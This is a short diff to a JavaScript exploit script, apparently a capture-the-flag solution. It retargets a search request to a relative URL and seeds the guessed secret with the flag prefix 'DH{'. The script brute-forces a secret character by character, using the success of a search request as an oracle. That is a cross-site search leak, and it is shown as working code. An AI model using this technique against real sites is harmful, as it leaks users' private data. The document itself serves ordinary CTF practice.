@@ -16,7 +16,7 @@
     async function search(query) {
         try {
             await req(
-              `http://localhost:8000/search?keyword=${query}`
+              `/search?keyword=${query}`
             );
             return true;
         } catch (e) {
@@ -25,7 +25,7 @@
     }
     async function exploit() {
         let chars = "0123456789abcdef}"
-        let secret = "a";
+        let secret = "DH{";
         while (!secret.includes("}")) {
             for (let c of chars) {
                 if (await search(secret + c)) {
